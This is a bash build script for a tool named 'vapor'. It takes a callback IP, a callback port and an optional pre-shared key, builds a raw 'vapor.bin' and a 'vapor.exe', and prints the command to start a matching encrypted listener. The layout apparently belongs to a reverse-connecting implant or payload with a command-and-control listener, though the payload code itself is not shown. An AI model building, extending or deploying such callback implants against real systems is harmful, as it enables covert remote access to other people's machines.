#!/bin/bash
# build.sh — one-command build for vapor
# Usage: ./build.sh <LHOST> <LPORT> [KEY]

set -e

if [ $# -lt 2 ]; then
    echo "Usage: ./build.sh <LHOST> <LPORT> [KEY]"
    echo "  LHOST  Callback IP"
    echo "  LPORT  Callback port"
    echo "  KEY    64-char hex PSK (auto-generated if omitted)"
    exit 1
fi

LHOST="$1"
LPORT="$2"
KEY="${3:-$(python3 -c "import secrets; print(secrets.token_hex(32))")}"

echo "[*] Building vapor"
echo "    LHOST = $LHOST"
echo "    LPORT = $LPORT"
echo "    KEY   = ${KEY:0:8}...${KEY: -8}"

make clean
make LHOST="$LHOST" LPORT="$LPORT" KEY="$KEY" all

BIN_SIZE=$(wc -c < vapor.bin)
EXE_SIZE=$(wc -c < vapor.exe)
echo ""
echo "[+] Built vapor.bin (${BIN_SIZE} bytes) + vapor.exe (${EXE_SIZE} bytes)"
echo ""
echo "[*] Start listener:"
echo "    python listener.py --lport $LPORT --key $KEY"
